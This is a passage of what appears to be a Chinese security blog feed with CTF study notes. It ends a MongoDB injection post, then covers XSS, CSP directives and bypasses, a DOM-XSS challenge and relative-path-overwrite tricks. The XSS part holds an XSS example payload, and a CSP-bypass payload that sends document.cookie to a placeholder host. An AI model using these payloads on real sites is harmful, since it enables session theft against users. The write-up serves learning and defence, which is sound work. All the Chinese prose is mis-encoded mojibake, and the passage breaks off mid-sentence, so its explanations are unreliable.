class="hljs-string">&quot;$cond&quot;</span>:<br>     &#123;<br>      <span class="hljs-string">&quot;if&quot;</span>:<br>      &#123;<br>          <span class="hljs-string">&quot;$eq&quot;</span>: [ <span class="hljs-string">&quot;$category&quot;</span>, <span class="hljs-string">&quot;flags&quot;</span> ]<br>      &#125;,<br>      <span class="hljs-string">&quot;then&quot;</span>: <span class="hljs-string">&quot;$title&quot;</span>,<br>      <span class="hljs-string">&quot;else&quot;</span>: <span class="hljs-string">&quot;$category&quot;</span><br>     &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>var_dump(json_decode(raw_query))</code>å³ä¸ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">object(stdClass)#4 (1) &#123;<br>  [<span class="hljs-string">&quot;category&quot;</span>]=&gt;<br>  object(stdClass)#3 (1) &#123;<br>    [<span class="hljs-string">&quot;$cond&quot;</span>]=&gt;<br>    object(stdClass)#2 (3) &#123;<br>      [<span class="hljs-string">&quot;if&quot;</span>]=&gt;<br>      object(stdClass)#1 (1) &#123;<br>        [<span class="hljs-string">&quot;$eq&quot;</span>]=&gt;<br>        <span class="hljs-function"><span class="hljs-title">array</span>(<span class="hljs-params"><span class="hljs-number">2</span></span>)</span> &#123;<br>          [<span class="hljs-number">0</span>]=&gt;<br>          string(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;$category&quot;</span><br>          [<span class="hljs-number">1</span>]=&gt;<br>          string(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;flags&quot;</span><br>        &#125;<br>      &#125;<br>      [<span class="hljs-string">&quot;then&quot;</span>]=&gt;<br>      string(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;$title&quot;</span><br>      [<span class="hljs-string">&quot;else&quot;</span>]=&gt;<br>      string(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;$category&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å‚è€ƒ</p><p><a href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html">https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1602092">https://cloud.tencent.com/developer/article/1602092</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/2021/09/16/2021-10-xss(1)/"/>
    <url>/2021/09/16/2021-10-xss(1)/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¯¹äºxsså¾—äº†è§£å’Œç†Ÿæ‚‰æ„Ÿè§‰è¿˜æ˜¯å¾ˆå°‘å¾—ï¼Œè¿™æ¬¡é›†ä¸­å­¦ä¹ ä¸€ä¸‹ã€‚</p><p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼Œæ˜¯æœ€æ™®éçš„Webåº”ç”¨å®‰å…¨æ¼æ´ã€‚è¿™ç±»æ¼æ´èƒ½å¤Ÿä½¿å¾—æ”»å‡»è€…åµŒå…¥æ¶æ„è„šæœ¬ä»£ç åˆ°æ­£å¸¸ç”¨æˆ·ä¼šè®¿é—®åˆ°çš„é¡µé¢ä¸­ï¼Œå½“æ­£å¸¸ç”¨æˆ·è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œåˆ™å¯å¯¼è‡´åµŒå…¥çš„æ¶æ„è„šæœ¬ä»£ç çš„æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„</p><p>ä¸€ä¸ªç®€å•çš„ XSS æ¼æ´é¡µé¢ï¼Œæ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œå°±åƒè¿™æ ·ï¼š</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">&lt;form&gt;<br>    &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&lt;?php echo $_GET[&quot;name&quot;]; ?&gt;&quot; /&gt;<br>    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;<br>&lt;/form&gt;<br></code></pre></div></td></tr></table></figure><p>å¯¹äºè¿™æ ·æ¯«æ— è¿‡æ»¤çš„é¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥è½»è€Œæ˜“ä¸¾çš„è¿›è¡Œ XSSã€‚</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">&quot;/&gt; &lt;script&gt;alert(0)&lt;/script&gt; &lt;!--<br></code></pre></div></td></tr></table></figure><p>ä½†å…¶å®è¿™ç§æ¼æ´é€šå¸¸å¯ä»¥ç”¨<code>htmlspecialchars</code> å‡½æ•°æ¥è¿‡æ»¤è¾“å…¥ã€‚</p><p><code>htmlspecialchars</code> å‡½æ•°ï¼šå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">&amp; (AND) =&gt; &amp;amp;<br>&quot; (åŒå¼•å·) =&gt; &amp;quot;<br>&#x27; (å•å¼•å·) =&gt; &amp;#039;<br>&lt; (å°äºå·) =&gt; &amp;lt; <br>&gt; (å¤§äºå·) =&gt; &amp;gt;<br></code></pre></div></td></tr></table></figure><p>ä½†æ˜¯ä»…ä»…è¿™æ ·é˜²å¾¡ä½¿ä¸å¤Ÿçš„ï¼Œè¿˜æœ‰å„ç§è¾“å…¥æ‰‹æ³•ï¼Œè¿™é‡Œç®€å•äº†è§£ä¸€ä¸‹<code>CSP</code>é˜²å¾¡æœºåˆ¶ï¼Œå…¶å®å°±æ˜¯ä»æµè§ˆå™¨å±‚é¢æ¥é˜²å¾¡ï¼Œè€Œä¸æ˜¯ä»ä»£ç ä¸­ã€‚</p><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>CSP çš„å®è´¨å°±æ˜¯ç™½åå•æœºåˆ¶ï¼Œå¯¹ç½‘ç«™åŠ è½½æˆ–æ‰§è¡Œçš„èµ„æºè¿›è¡Œå®‰å…¨ç­–ç•¥çš„æ§åˆ¶ã€‚</p><h3 id="cspç»“æ„"><a href="#cspç»“æ„" class="headerlink" title="cspç»“æ„"></a>cspç»“æ„</h3><p>ä¸¤ç§æ–¹æ³•å¯ä»¥å¯ç”¨ CSPã€‚ä¸€ç§æ˜¯é€šè¿‡ HTTP å¤´ä¿¡æ¯çš„<code>Content-Security-Policy</code>çš„å­—æ®µã€‚</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>script-src &#x27;self&#x27;; object-src &#x27;none&#x27;;<br>style-src cdn.example.org third-party.org; child-src https:<br></code></pre></div></td></tr></table></figure><p>å¦ä¸€ç§æ˜¯é€šè¿‡ç½‘é¡µçš„<code>&lt;meta&gt;</code>æ ‡ç­¾ã€‚</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.o</span></span><br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­æ¯ä¸€ç»„ç­–ç•¥åŒ…å«ä¸€ä¸ªç­–ç•¥æŒ‡ä»¤å’Œä¸€ä¸ªå†…å®¹æºåˆ—è¡¨ã€‚ç®€å•çš„è¯´ä¸€ä¸‹ä¸€äº›ç­–ç•¥æŒ‡ä»¤</p><p><strong>default-src</strong></p><p>default-src ä½œä¸ºæ‰€æœ‰å…¶ä»–æŒ‡ä»¤çš„å¤‡ç”¨ï¼Œä¸€èˆ¬æ¥è¯´ default-src â€˜noneâ€™; script-src â€˜selfâ€™ è¿™æ ·çš„æƒ…å†µå°±ä¼šæ˜¯ script-src éµå¾ª selfï¼Œå…¶ä»–çš„éƒ½ä¼šä½¿ç”¨ noneã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé™¤äº†è¢«è®¾ç½®çš„æŒ‡ä»¤ä»¥å¤–ï¼Œå…¶ä½™æŒ‡ä»¤éƒ½ä¼šè¢«è®¾ç½®ä¸º default-src æŒ‡ä»¤æ‰€è®¾ç½®çš„å±æ€§ã€‚</p><p>å¯¹äºè¿™ä¸ªå±æ€§æœ‰ä¸ªç‰¹æ®Šçš„é…ç½®å« unsafe-evalï¼Œå®ƒä¼šå…è®¸ä¸‹é¢å‡ ä¸ªå‡½æ•°ï¼š</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">eval() Function() setTimeout() with an initial argument which is not callable.setInterval() with an initial argument which is not callable.<br></code></pre></div></td></tr></table></figure><p><strong>å…³é”®å­—</strong></p><p><strong>â€˜noneâ€™</strong></p><p>ä»£è¡¨ç©ºé›†ï¼›å³ä¸åŒ¹é…ä»»ä½• URLã€‚</p><p><strong>â€˜selfâ€™</strong></p><p>ä»£è¡¨å’Œæ–‡æ¡£åŒæºï¼ŒåŒ…æ‹¬ç›¸åŒçš„ URL åè®®å’Œç«¯å£å·ã€‚ä¹Ÿå°±æ˜¯å¸¸è¯´çš„åŒæºç­–ç•¥ã€‚</p><p><strong>â€˜unsafe-inlineâ€™</strong></p><p>å…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œå¦‚å†…è”çš„ script å…ƒç´ ã€javascript: URLã€å†…è”çš„äº‹ä»¶å¤„ç†å‡½æ•°å’Œå†…è”çš„ style å…ƒç´ ã€‚</p><p><strong>â€˜unsafe-evalâ€™</strong></p><p>å…è®¸ä½¿ç”¨ eval() ç­‰é€šè¿‡å­—ç¬¦ä¸²åˆ›å»ºä»£ç çš„æ–¹æ³•ã€‚</p><p><strong>æ•°æ®</strong></p><p><strong>data:</strong></p><p>å…è®¸ data: URI ä½œä¸ºå†…å®¹æ¥æºã€‚è¿™æ˜¯ä¸å®‰å…¨çš„ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥ç²¾å¿ƒæ„é€  data: URI æ¥æ”»å‡»ã€‚è¯·è°¨æ…åœ°ä½¿ç”¨è¿™ä¸ªæºï¼Œå¹¶ç¡®ä¿ä¸è¦ç”¨äºè„šæœ¬ã€‚</p><p><strong>mediastream:</strong></p><p>å…è®¸ mediastream: URI ä½œä¸ºå†…å®¹æ¥æºã€‚</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">Content-Security-Policy: default-src &#x27;self&#x27;; img-src &#x27;self&#x27; data:; media-src mediastream:<br></code></pre></div></td></tr></table></figure><h3 id="cspçš„ä¸€äº›ç»•è¿‡"><a href="#cspçš„ä¸€äº›ç»•è¿‡" class="headerlink" title="cspçš„ä¸€äº›ç»•è¿‡"></a>cspçš„ä¸€äº›ç»•è¿‡</h3><p><strong>metaç½‘é¡µè·³è½¬ç»•è¿‡</strong></p><p>è¿™ä¸ªæƒ…å†µçš„è¯ï¼Œå¯ä»¥åˆ©ç”¨ meta æ ‡ç­¾å®ç°ç½‘é¡µè·³è½¬ï¼š</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">127.0.0.1/csp/?twosecurity=&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://x.x.x.x/&quot; &gt;<br></code></pre></div></td></tr></table></figure><p><strong>locationç»•è¿‡</strong></p><p>æœ‰çš„æƒ…å†µ csp ä¼šä½¿ç”¨ script-src â€˜unsafe-inlineâ€™; è¿™ä¸ªåœ°æ–¹å¯ä»¥ç›´æ¥ç”¨location.href(window.location/window.open) ç»•è¿‡</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">127.0.0.1/csp/?twosecurity=&lt;script&gt;location.href=&#x27;http://x.x.x.x/cookie/&#x27;%2bescape(document.cookie);&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p><strong>ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡</strong></p><p>ç»™ä¸€ä¸ªç»•è¿‡ codimd çš„ codimd xss</p><p>ä¾‹å­ä¸­ codimd çš„ CSP ä¸­ä½¿ç”¨äº† google-analyticsï¼Œè€Œ analytics ä¸­æä¾›äº†è‡ªå®šä¹‰ javascript çš„åŠŸèƒ½ï¼ˆgoogleä¼šå°è£…è‡ªå®šä¹‰çš„jsï¼Œæ‰€ä»¥è¿˜éœ€è¦ unsafe-evalï¼‰ï¼Œäºæ˜¯å¯ä»¥ç»•è¿‡ CSPã€‚</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;&gt;<br>&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>è¿˜æœ‰å¾ˆå¤šç»•è¿‡ï¼Œå‚è€ƒï¼š<a href="https://lorexxar.cn/2017/10/25/csp-paper/#1%E3%80%82">https://lorexxar.cn/2017/10/25/csp-paper/#1ã€‚</a></p><h1 id="ctfä¾‹é¢˜"><a href="#ctfä¾‹é¢˜" class="headerlink" title="ctfä¾‹é¢˜"></a>ctfä¾‹é¢˜</h1><h2 id="ä¸€é“XSSé¢˜ç›®åˆ†æ"><a href="#ä¸€é“XSSé¢˜ç›®åˆ†æ" class="headerlink" title="ä¸€é“XSSé¢˜ç›®åˆ†æ"></a>ä¸€é“XSSé¢˜ç›®åˆ†æ</h2><p>é¢˜ç›®åœ°å€ï¼š<a href="https://challenge.intigriti.io/%E3%80%82%E8%83%BD%E8%AE%BF%E9%97%AE%E4%BD%86%E7%8E%AF%E5%A2%83%E5%A5%BD%E5%83%8F%E6%B2%A1%E4%BA%86">https://challenge.intigriti.io/ã€‚èƒ½è®¿é—®ä½†ç¯å¢ƒå¥½åƒæ²¡äº†</a></p><p>å‚è€ƒé¢˜è§£å§ï¼š<a href="https://www.secpulse.com/archives/128882.html">https://www.secpulse.com/archives/128882.html</a></p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> hash = <span class="hljs-built_in">document</span>.location.hash.substr(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (hash) &#123;<br>    displayReason(hash);<br>&#125;<br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;reasons&quot;</span>).onchange = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (e.target.value != <span class="hljs-string">&quot;&quot;</span>)<br>        displayReason(e.target.value);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reasonLoaded</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> reason = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;reason&quot;</span>);<br>    reason.innerHTML = <span class="hljs-built_in">unescape</span>(<span class="hljs-built_in">this</span>.responseText);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">displayReason</span>(<span class="hljs-params">reason</span>) </span>&#123;<br>    <span class="hljs-built_in">window</span>.location.hash = reason;<br>    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();<br>    xhr.addEventListener(<span class="hljs-string">&quot;load&quot;</span>, reasonLoaded);<br>    xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">`./reasons/<span class="hljs-subst">$&#123;reason&#125;</span>.txt`</span>);<br>    xhr.send();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><p>äº†è§£<code>inerHTML</code>è§¦å‘<code>DOMxss</code>æ¼æ´</p><p>å¯»æ‰¾content injection</p><p>å¯»æ‰¾ç«™å†…å¯æ§çš„contentï¼Œé€šè¿‡<code>iframe</code>çš„<code>srcdoc</code>å±æ€§å¯ä»¥ç»•è¿‡<code>innerHTML</code>ä¸è§£æ<code>&lt;script&gt;</code>çš„é™åˆ¶</p><p>æ„é€ payloadæ³¨å…¥</p><h2 id="34C3CTF-urlstorage"><a href="#34C3CTF-urlstorage" class="headerlink" title="34C3CTF urlstorage"></a>34C3CTF urlstorage</h2><p><a href="https://lorexxar.cn/2018/01/02/34c3-writeup/#CSS-RPO">https://lorexxar.cn/2018/01/02/34c3-writeup/#CSS-RPO</a></p><p><a href="http://www.thespanner.co.uk/2014/03/21/rpo/">http://www.thespanner.co.uk/2014/03/21/rpo/</a></p><p><a href="http://blog.nsfocus.net/rpo-attack/">http://blog.nsfocus.net/rpo-attack/</a></p><p>è€ƒç‚¹ä¸º<code>rpo</code>+<code>csrf</code>+<code>xss</code></p><h3 id="nginxå’Œapache2çš„å·®å¼‚åŒ–"><a href="#nginxå’Œapache2çš„å·®å¼‚åŒ–" class="headerlink" title="nginxå’Œapache2çš„å·®å¼‚åŒ–"></a>nginxå’Œapache2çš„å·®å¼‚åŒ–</h3><p>é¦–å…ˆäº†è§£ä¸€ä¸‹nginxå’Œapache2å¯¹äºurlåœ°å€è§£æçš„ä¸åŒ</p><p>nginxå¯¹äº%2fæ˜¯èƒ½å¤Ÿè§£ææˆ/çš„ä½†æ˜¯apache2ä¸è¡Œ</p><p><img src="https://img-blog.csdnimg.cn/034c2f2f20c34345947590dd8cb2ec73.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç¬¬äºŒä¸ªå·®å¼‚åŒ–åœ¨äº</p><p>åœ¨Nginxä¸­ï¼Œç¼–ç åçš„urlæœåŠ¡å™¨å¯ä»¥æ­£å¸¸è¯†åˆ«ï¼Œä¹Ÿå°±æ˜¯è¯´æœåŠ¡å™¨åœ¨åŠ è½½æ–‡ä»¶æ—¶ä¼šè§£ç åæ‰¾åˆ°å…·ä½“æ–‡ä»¶è¿”å›è¿”å›å®¢æˆ·ç«¯ã€‚</p><p>ä½†æ˜¯åœ¨å®¢æˆ·ç«¯è¯†åˆ«urlæ—¶æ˜¯ä¸ä¼šè§£ç çš„ï¼Œæ­£å¸¸æƒ…å†µä¸‹è§£ç %2fè§£ç ååº”è¯¥åŠ è½½çš„æ˜¯<code>rpo/xxx/../x.js</code>ï¼Œæœ€åä¹Ÿå°±æ˜¯rpo/x.jsæ–‡ä»¶ï¼›è€Œè¿™é‡ŒåŠ è½½çš„æ˜¯/x.jsï¼Œæ‰€ä»¥æµè§ˆå™¨æ˜¯æ²¡æœ‰è§£ç %2fçš„ã€‚</p><p>å½“urlä¸º<code>/rpo/%2f../1.php</code>æ—¶æœ€ç»ˆè®¿é—®çš„æ˜¯<code>/1.php</code></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211005115258272.png" alt="image-20211005115258272"></p><p>è¿™é‡Œå…¶å®æ˜¯å®¢æˆ·ç«¯æµè§ˆå™¨åœ¨åŠ è½½ç›¸å¯¹è·¯å¾„æ–‡ä»¶æ—¶æ˜¯ä»¥æœ€åä¸€ä¸ª/ä¸ºç›¸å¯¹ç›®å½•åŠ è½½å…·ä½“èµ„æºæ–‡ä»¶çš„ã€‚</p><h3 id="ç®€å•å®ä¾‹ï¼š"><a href="#ç®€å•å®ä¾‹ï¼š" class="headerlink" title="ç®€å•å®ä¾‹ï¼š"></a>ç®€å•å®ä¾‹ï¼š</h3><h4 id="ä¸€ï¼šåŠ è½½é™æ€æ–‡ä»¶"><a href="#ä¸€ï¼šåŠ è½½é™æ€æ–‡ä»¶" class="headerlink" title="ä¸€ï¼šåŠ è½½é™æ€æ–‡ä»¶"></a>ä¸€ï¼šåŠ è½½é™æ€æ–‡ä»¶</h4><p>ç°åœ¨æœ‰ä¸€ä¸ªphpè·¯ç”±<code>/rpo/111/1.php</code>æºç é‡Œé¢é€šè¿‡<code>&lt;script src=&quot;../x.js&quot;&gt;&lt;/script&gt;</code>ç”¨ç›¸å¯¹ç›®å½•åŠ è½½äº†é™æ€æ–‡ä»¶ï¼Œè¿™æ—¶å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶å¦å¤–çš„ä¸€ä¸ªåœ¨åˆ«çš„ç›®å½•ä¸‹<code>x.js</code>çš„å†…å®¹ï¼Œå†è®©<code>x.js</code>åŠ è½½åˆ°<code>1.php</code>ä¸‹ä¾¿å¯æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><p>æ­£å¸¸è®¿é—®ä¸‹ï¼Œè¿™é‡Œå¯ä»¥éšä¾¿åœ¨111ç›®å½•ä¸‹åˆ›å»ºä¸ªx.jsæ–‡ä»¶ã€‚</p><p><img src="https://img-blog.csdnimg.cn/25c3902c99994e1a93d2dd4259e67f09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ„é€ è¿™æ ·ä¸€ä¸ªè·¯ç”±<code>/rpo/222/test.php%2f..%2f..%2f111/1.php</code>ä¾¿å¯æ‰§è¡Œ<code>x.js</code>å†…å®¹ã€‚</p><p><img src="https://img-blog.csdnimg.cn/ab9a9b65a09e4ac5bbad4fed5c790b19.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åŠ è½½å…¶ä»–çš„é™æ€æ–‡ä»¶ä¹Ÿæ˜¯ä¸€æ ·çš„åŸç†ã€‚</p><h4 id="äºŒï¼šå°†è¿”å›å†…å®¹æŒ‰é™æ€æ–‡ä»¶è§£æ"><a href="#äºŒï¼šå°†è¿”å›å†…å®¹æŒ‰é™æ€æ–‡ä»¶è§£æ" class="headerlink" title="äºŒï¼šå°†è¿”å›å†…å®¹æŒ‰é™æ€æ–‡ä»¶è§£æ"></a>äºŒï¼š<strong>å°†è¿”å›å†…å®¹æŒ‰é™æ€æ–‡ä»¶è§£æ</strong></h4><p>è¿™ä¸ªæ‡’å¾—åšä¸€éäº†ï¼Œç®€å•æè¿°ä¸€ä¸‹å°±æ˜¯ï¼Œåœ¨æŸäº›åœºæ™¯ä¸‹ç±»ä¼¼äºåœ¨å¾ˆå¤šä½¿ç”¨äº†<code>url_rewrite</code>çš„phpå¼€å‘æ¡†æ¶ä»¥åŠpython webæ¡†æ¶ä¸­ï¼Œç»å¸¸ä½¿ç”¨ç›¸å¯¹è·¯å¾„æ¥åŠ è½½é™æ€èµ„æºæ–‡ä»¶ï¼Œè€Œä¸”urléƒ½æœ‰ä¸€ä¸ªç‰¹å¾ï¼š</p><p>æ¯”å¦‚<code>/rpo/user/id/1</code>ï¼Œè¿™é‡Œè¡¨ç¤ºä½¿ç”¨å‚æ•°ä¸º<code>id</code>ï¼Œå€¼ä¸º1çš„å†…å®¹è®¿é—®<code>user</code>æ¥å£ï¼›</p><p>æ¯”å¦‚<code>/rpo/user.php/name/tester</code>ï¼Œè¿™é‡Œè¡¨ç¤ºä½¿ç”¨å‚æ•°<code>name</code>ï¼Œå†…å®¹ä¸ºtesterçš„å†…å®¹è®¿é—®<code>user.php</code>æ–‡ä»¶ç­‰ã€‚</p><p>ä¾‹å¦‚è¿™é‡Œå¦‚æœä»ç„¶å­˜åœ¨ä¸€ä¸ªè·¯ç”±<code>/rpo/user</code>é€šè¿‡ç›¸å¯¹ç›®å½•é™æ€åŠ è½½äº†<code>style.css</code>å’Œ<code>style.js</code>æ–‡ä»¶ã€‚</p><p>åœ¨<code>/rpo/user</code>ç•Œé¢æˆ‘ä»¬å¯ä»¥æäº¤å†…å®¹ï¼Œç„¶åå†…å®¹ä¼šæ˜¾ç¤ºåˆ°å½“å‰é¡µé¢ï¼Œè€Œä¸”ä½¿ç”¨ç›¸å¯¹è·¯å¾„åŠ è½½é™æ€æ–‡ä»¶style.csså’Œscript.jsæ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶åŸæœ¬å†…å®¹ä¸ºç©ºï¼Œæ­¤æ—¶æˆ‘ä»¬è®¿é—®ï¼š</p><p>å½“ä½ è®¿é—®<code>/rpo/user</code>æ—¶åŠ è½½çš„æ˜¯<code>/rpo/user/style.csså’Œ/rpo/user/style.js</code>ã€‚</p><p>å½“ä½ ç”¨<code>/user/2</code>è¿™é‡Œè¡¨ç¤ºä½¿ç”¨2ä½œä¸ºå‚æ•°è¯·æ±‚useræ¥å£ï¼Œæ­¤æ—¶åŠ è½½é™æ€æ–‡ä»¶å’Œä¸Šè¿°ç›¸åŒã€‚</p><p>ç„¶åæˆ‘ä»¬æäº¤ä¸€æ®µcsså†…å®¹ï¼š<code>&#123;&#125; * &#123;color:red;&#125;</code></p><p>å½“æˆ‘ä»¬è®¿é—®ï¼š<code>/rpo/user/2/xxx</code>æ—¶ï¼š</p><p><code>&#123;&#125; * &#123;color:red;&#125;</code>è¿™æ®µå†…å®¹ä¼šè¢«å½“æˆcssè§£æã€‚</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/01/9-1.png" alt="img"></p><p>è¿™é‡Œè¡¨ç¤ºæˆ‘ä»¬ä½¿ç”¨2/xxxä½œä¸ºå‚æ•°è®¿é—®useræ¥å£ï¼Œè¿”å›çš„å†…å®¹å’Œä½¿ç”¨å‚æ•°2è®¿é—®è¿”å›çš„å†…å®¹ç›¸åŒã€‚</p><p>ä½†æ˜¯æµè§ˆå™¨å®¢æˆ·ç«¯è®¤ä¸º2æ˜¯ç›®å½•ï¼Œç„¶ååŠ è½½çš„é™æ€æ–‡ä»¶ä¸º:</p><p><code>/user/2/style.css</code></p><p>è¿™é‡Œå°±ç”¨åˆ°äº†ä¸Šé¢è¯´åˆ°çš„ç‰¹ç‚¹ï¼Œè¿™é‡Œçš„æ„æ€æ˜¯ç”¨å‚æ•°ä¸º2ï¼Œå†…å®¹ä¸º<code>style.css</code>çš„å†…å®¹è®¿é—®userï¼Œè¿™é‡Œå¯ä»¥å‘ç°æ—¶åŠ 